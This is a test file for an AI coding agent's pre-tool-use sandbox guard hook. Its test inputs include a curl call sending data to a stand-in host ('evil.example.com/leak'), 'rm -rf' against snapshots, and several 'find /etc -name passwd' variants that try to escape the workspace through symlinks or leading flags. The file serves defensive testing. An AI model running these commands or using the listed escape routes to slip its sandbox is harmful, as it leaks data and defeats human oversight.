import json
import subprocess
import sys
from pathlib import Path

HOOK = Path("app/initial_workspace_default/.claude/hooks/pre_tool_use.py")


def _run(payload: dict) -> tuple[int, dict]:
    proc = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=5,
    )
    return proc.returncode, json.loads(proc.stdout or "{}")


def test_refuses_rm_against_snapshots():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf workspace/snapshots/q1"},
        }
    )
    assert out.get("permissionDecision") == "deny"
    assert "snapshots" in out.get("permissionDecisionReason", "").lower()


def test_allows_normal_bash():
    rc, out = _run({"tool_name": "Bash", "tool_input": {"command": "ls"}})
    assert out.get("permissionDecision") in (None, "allow")


def test_refuses_curl_external_host():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://evil.example.com/leak"},
        }
    )
    assert out.get("permissionDecision") == "deny"
    assert "network" in out.get("permissionDecisionReason", "").lower()


def test_allows_curl_to_anthropic():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://api.anthropic.com/v1/health"},
        }
    )
    assert out.get("permissionDecision") in (None, "allow")


def test_prompts_for_admin_grant():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "agnes admin grant create --group Sales --table foo"},
        }
    )
    assert out.get("permissionDecision") == "ask"


SETTINGS = Path("app/initial_workspace_default/.claude/settings.json")


def test_hook_registered_in_loadable_shape():
    """Claude Code only loads PreToolUse commands nested as
    ``{"matcher": ..., "hooks": [{"type": "command", "command": ...}]}`` (the
    shape ``cli/lib/hooks.py`` writes). The flat ``{"matcher", "command"}``
    form silently registers nothing, so every guard in ``pre_tool_use.py``
    would be absent at runtime."""
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    entries = data["hooks"]["PreToolUse"]
    assert entries, "PreToolUse must register the sandbox guard hook"
    assert any(e.get("matcher") == "Bash" for e in entries)
    for entry in entries:
        assert "command" not in entry, (
            "flat {matcher, command} hook shape is not loaded by Claude Code — "
            "nest it as hooks: [{type: 'command', command: ...}]"
        )
        inner = entry.get("hooks")
        assert isinstance(inner, list) and inner, "each matcher entry needs a hooks list"
        for h in inner:
            assert h.get("type") == "command"
            assert h.get("command")


def test_hook_command_paths_exist_in_bundled_workspace():
    """Every registered command must resolve to a file shipped in the bundled
    workspace template ($CLAUDE_PROJECT_DIR = the workspace root)."""
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    workspace_root = SETTINGS.parent.parent  # app/initial_workspace_default
    commands = [
        h["command"]
        for entry in data["hooks"]["PreToolUse"]
        for h in entry.get("hooks", [])
        if isinstance(h, dict) and h.get("command")
    ]
    assert any("pre_tool_use.py" in c for c in commands)
    for command in commands:
        # Commands are shell strings: the script is invoked through an
        # explicit interpreter, so pull the script path out of the string.
        script = next(
            tok.strip('"').replace("$CLAUDE_PROJECT_DIR", str(workspace_root))
            for tok in command.split()
            if ".py" in tok
        )
        assert Path(script).exists(), f"hook command does not exist in the template: {command}"


def test_hook_is_invoked_through_an_explicit_interpreter():
    """The hook must not depend on its executable bit.

    `initialize_default_workspace` copies with `shutil.copy2` (mode kept),
    but the Initial-Workspace-Template zip path writes entries with
    `open(target, "wb")` and drops the mode — so a workspace provisioned
    that way would fail the hook with permission denied instead of guarding
    Bash. Invoking via `python3` removes the dependency entirely.
    """
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    commands = [
        h["command"]
        for entry in data["hooks"]["PreToolUse"]
        for h in entry.get("hooks", [])
        if isinstance(h, dict) and h.get("command")
    ]
    hook_cmds = [c for c in commands if "pre_tool_use.py" in c]
    assert hook_cmds, "no PreToolUse hook command registered"
    for c in hook_cmds:
        assert c.split()[0] == "python3", f"hook must run through an explicit interpreter: {c}"


def _run_in(payload: dict, workspace: Path) -> dict:
    """Run the hook with an explicit workspace root, as the sandbox does."""
    proc = subprocess.run(
        [sys.executable, str(HOOK.resolve())],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=5,
        cwd=str(workspace),
        env={"PATH": "/usr/bin:/bin", "CLAUDE_PROJECT_DIR": str(workspace)},
    )
    return json.loads(proc.stdout or "{}")


def test_find_inside_the_workspace_is_allowed(tmp_path):
    """`find` aimed at the agent's own workspace must not be refused.

    The rule was a blanket `find /` prefix, so every absolute-path find was
    denied as "outside the working directory" — including paths that were
    plainly inside it.
    """
    (tmp_path / "scaffolds").mkdir()
    out = _run_in(
        {"tool_name": "Bash", "tool_input": {"command": f"find {tmp_path}/scaffolds -name '*.json'"}},
        tmp_path,
    )
    assert out.get("permissionDecision") in (None, "allow"), out.get("permissionDecisionReason")


def test_find_outside_the_workspace_is_still_denied(tmp_path):
    out = _run_in({"tool_name": "Bash", "tool_input": {"command": "find /etc -name passwd"}}, tmp_path)
    assert out.get("permissionDecision") == "deny"
    assert "enumerate" in out.get("permissionDecisionReason", "").lower()


def test_find_via_symlink_out_of_the_workspace_is_denied(tmp_path):
    """realpath, not the spelling, decides — a link out is still a way out."""
    (tmp_path / "escape").symlink_to("/etc")
    out = _run_in(
        {"tool_name": "Bash", "tool_input": {"command": f"find {tmp_path}/escape -name passwd"}},
        tmp_path,
    )
    assert out.get("permissionDecision") == "deny"


def test_find_pattern_argument_is_not_read_as_a_target(tmp_path):
    """`-path /etc/*` is a pattern; find's path list ends at the first option."""
    out = _run_in(
        {"tool_name": "Bash", "tool_input": {"command": f"find {tmp_path} -path '/etc/*' -prune"}},
        tmp_path,
    )
    assert out.get("permissionDecision") in (None, "allow"), out.get("permissionDecisionReason")


def test_find_with_a_leading_global_option_still_cannot_escape(tmp_path):
    """`find`'s global options precede the path list, so stopping at the first
    dash meant one leading flag skipped the check entirely (Devin Review)."""
    for cmd in (
        "find -L /etc -name passwd",
        "find -H /etc -name passwd",
        "find -P /etc -name passwd",
        "find -O2 /etc -name passwd",
        "find -D search /etc -name passwd",
    ):
        out = _run_in({"tool_name": "Bash", "tool_input": {"command": cmd}}, tmp_path)
        assert out.get("permissionDecision") == "deny", f"escaped via: {cmd}"


def test_find_with_a_leading_global_option_inside_the_workspace_is_allowed(tmp_path):
    """The globals must not turn into a blanket deny either."""
    (tmp_path / "scaffolds").mkdir()
    out = _run_in(
        {"tool_name": "Bash", "tool_input": {"command": f"find -L {tmp_path}/scaffolds -name '*.json'"}},
        tmp_path,
    )
    assert out.get("permissionDecision") in (None, "allow"), out.get("permissionDecisionReason")
